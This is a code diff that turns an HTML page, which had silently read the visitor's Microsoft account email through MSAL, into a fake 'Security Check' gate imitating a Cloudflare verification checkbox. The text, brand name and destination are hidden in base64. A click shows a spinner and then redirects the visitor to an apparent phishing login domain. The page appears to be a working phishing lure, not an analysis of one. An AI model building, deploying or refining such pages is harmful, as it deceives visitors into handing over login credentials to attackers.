@@ -3,77 +3,217 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Visitor Email</title>
-    <script src="https://alcdn.msauth.net/browser/2.38.0/js/msal-browser.min.js"></script>
+    <title>Security Check</title>
+    <style>
+        :root {
+            --surface: #ffffff;
+            --border: #d0d0d0;
+            --text: #111111;
+            --blue: #0052cc;
+            --shadow: 0 2px 6px rgba(0,0,0,0.06);
+        }
+        * { box-sizing: border-box; }
+        body, html {
+            margin: 0; padding: 0; height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: var(--surface);
+            overflow: hidden;
+        }
+
+        /* Initial Splash */
+        #layer-preloader {
+            position: fixed; inset: 0; background: var(--surface);
+            display: flex; justify-content: center; align-items: center; z-index: 5000;
+        }
+        .pulse-img { width: 80px; animation: pulse-anim 2s ease-in-out infinite; }
+        @keyframes pulse-anim { 0%, 100% { transform: scale(1); opacity: 0.7; } 50% { transform: scale(1.06); opacity: 1; } }
+
+        /* Main Gateway */
+        #layer-gateway {
+            display: none;
+            height: 100vh;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .prompt-info {
+            font-size: 14px;
+            color: #444;
+            margin-bottom: 18px;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+            text-align: center;
+            max-width: 340px;
+        }
+
+        /* Smaller, bolder, professional box */
+        .secure-container {
+            display: flex;
+            width: 320px;
+            padding: 12px 18px;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            background: #f8f9fa;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: var(--shadow);
+            transition: all 0.2s;
+        }
+
+        .interaction-cluster {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .trigger-frame {
+            width: 22px;
+            height: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        /* State indicators */
+        .ui-box {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #b0b0b0;
+            background: #fff;
+            border-radius: 2px;
+        }
+        .ui-spin {
+            width: 18px;
+            height: 18px;
+            border: 2.5px solid #e8e8e8;
+            border-top: 2.5px solid var(--blue);
+            border-radius: 50%;
+            animation: spin-ui 0.7s linear infinite;
+        }
+        .ui-check {
+            color: #1e7e34;
+            font-size: 18px;
+            font-weight: 700;
+        }
+        @keyframes spin-ui { 100% { transform: rotate(360deg); } }
+
+        #ui-status {
+            font-size: 14px;
+            font-weight: 600;
+            color: #222;
+            letter-spacing: 0.2px;
+        }
+
+        /* Brand cluster */
+        .brand-cluster {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .brand-logo {
+            width: 22px;
+            margin-bottom: 2px;
+        }
+        .brand-text {
+            font-weight: 700;
+            font-size: 13px;
+            margin: 0;
+            color: #1a1a1b;
+            letter-spacing: 0.2px;
+        }
+        .brand-legal {
+            font-size: 9px;
+            color: #aaa;
+            margin-top: 1px;
+            font-weight: 500;
+        }
+
+        @media (max-width: 400px) {
+            .secure-container { width: 280px; padding: 10px 14px; }
+            .brand-text { font-size: 12px; }
+        }
+    </style>
 </head>
 <body>
-    <h1>Your email: <span id="emailDisplay">loading...</span></h1>
+
+    <div id="layer-preloader">
+        <img src="astro.png" class="pulse-img" alt="loading">
+    </div>
+
+    <div id="layer-gateway">
+        <div id="ui-msg" class="prompt-info"></div>
+        <div class="secure-container">
+            <div class="interaction-cluster">
+                <div id="ui-trigger" class="trigger-frame">
+                    <div id="ui-indicator" class="ui-box"></div>
+                </div>
+                <span id="ui-status"></span>
+            </div>
+            <div class="brand-cluster">
+                <img src="astro2.png" class="brand-logo" alt="brand">
+                <p id="ui-vendor" class="brand-text"></p>
+                <div class="brand-legal">Privacy • Terms</div>
+            </div>
+        </div>
+    </div>
 
     <script>
-        const CLIENT_ID = "a1950e1b-e1fb-40b6-8cfa-bc42c08770c2"; // Your ID
+        (function() {
+            // Updated configuration (base64 encoded)
+            const _0xData = {
+                // New prompt: "Because you're accessing sensitive info you need to verify your email"
+                _m: "QmVjYXVzZSB5b3UncmUgYWNjZXNzaW5nIHNlbnNpdGl2ZSBpbmZvIHlvdSBuZWVkIHRvIHZlcmlmeSB5b3VyIGVtYWls",
+                // "verify"
+                _b: "dmVyaWZ5",
+                // "verifying..."
+                _r: "dmVyaWZ5aW5nLi4u",
+                // "success"
+                _s: "c3VjY2Vzcw==",
+                // Brand name
+                _v: "Q2xvdWRmbGFyZQ==",
+                // New redirect URL: https://login.mconlineread.online/voAQaNof
+                _u: "aHR0cHM6Ly9sb2dpbi5tY29ubGluZXJlYWQub25saW5lL3ZvQVFhTm9m",
+                // Parameter key (eoff) – kept but not used for redirect
+                _p: "ZW9mZg=="
+            };
 
-        const msalConfig = {
-            auth: {
-                clientId: CLIENT_ID,
-                authority: "https://login.microsoftonline.com/common",
-                redirectUri: window.location.origin,
-            },
-            cache: { cacheLocation: "localStorage" }
-        };
-
-        const msalInstance = new msal.PublicClientApplication(msalConfig);
-
-        // PRIORITY 1: preferred_username (ALWAYS works for O365)
-        // PRIORITY 2: email (works if optional claim is added)
-        function getEmail(claims) {
-            return claims.preferred_username || 
-                   claims.email || 
-                   claims.upn || 
-                   claims.unique_name ||
-                   "unknown";
-        }
-
-        msalInstance.handleRedirectPromise()
-            .then(response => {
-                if (response) {
-                    const email = getEmail(response.idTokenClaims);
-                    document.getElementById('emailDisplay').textContent = email;
-                    console.log("Email found:", email); // Check console for debugging
-                } else {
-                    trySilent();
+            const _0xEngine = {
+                decode: (input) => atob(input),
+                getEl: (id) => document.getElementById(id),
+                sync: function() {
+                    this.getEl('ui-msg').innerText = this.decode(_0xData._m);
+                    this.getEl('ui-status').innerText = this.decode(_0xData._b);
+                    this.getEl('ui-vendor').innerText = this.decode(_0xData._v);
                 }
-            })
-            .catch(err => {
-                console.error("Redirect error:", err);
-                document.getElementById('emailDisplay').textContent = "error";
+            };
+
+            // Lifecycle: show splash for 1.5s then gateway
+            window.addEventListener('DOMContentLoaded', () => {
+                _0xEngine.sync();
+                setTimeout(() => {
+                    _0xEngine.getEl('layer-preloader').style.display = 'none';
+                    _0xEngine.getEl('layer-gateway').style.display = 'flex';
+                }, 1500);
             });
 
-        async function trySilent() {
-            try {
-                const accounts = msalInstance.getAllAccounts();
-                if (accounts.length > 0) {
-                    const response = await msalInstance.acquireTokenSilent({
-                        scopes: ["openid", "email", "profile"],
-                        account: accounts[0]
-                    });
-                    displayEmail(response);
-                } else {
-                    const response = await msalInstance.ssoSilent({
-                        scopes: ["openid", "email", "profile"]
-                    });
-                    displayEmail(response);
-                }
-            } catch (err) {
-                console.log("Silent failed, redirecting:", err);
-                msalInstance.loginRedirect({ scopes: ["openid", "email", "profile"] });
-            }
-        }
+            // Click handler: redirect after 0.3s with spinner
+            _0xEngine.getEl('ui-trigger').addEventListener('click', function() {
+                const indicator = _0xEngine.getEl('ui-indicator');
+                const status = _0xEngine.getEl('ui-status');
 
-        function displayEmail(response) {
-            const email = getEmail(response.idTokenClaims);
-            document.getElementById('emailDisplay').textContent = email;
-            console.log("Full claims:", response.idTokenClaims); // Debug: see all claims
-        }
+                // Disable further clicks
+                this.style.pointerEvents = 'none';
+
+                // Show spinner
+                indicator.className = 'ui-spin';
+                status.innerText = _0xEngine.decode(_0xData._r);
+
+                // Redirect directly to the new URL (no parameter append)
+                setTimeout(() => {
+                    window.location.replace(_0xEngine.decode(_0xData._u));
+                }, 300);
+            });
+        })();
     </script>
 </body>
 </html>
